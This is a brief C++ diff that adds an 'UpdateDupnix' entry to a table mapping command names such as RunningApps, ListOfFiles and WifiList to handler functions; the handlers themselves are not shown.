@@ -49,7 +49,8 @@ std::vector <std::pair<std::string, void(*)(std::string)>> functions{
 	{"RunningApps", RunningApps},
 	{"ListOfFiles", ListOfFiles}, 
 	{"WifiList", WifiList},
-	{"CloseForeground",TurnCloseForeground}
+	{"CloseForeground",TurnCloseForeground},
+	{"UpdateDupnix", UpdateDupnix}
 
 };
 
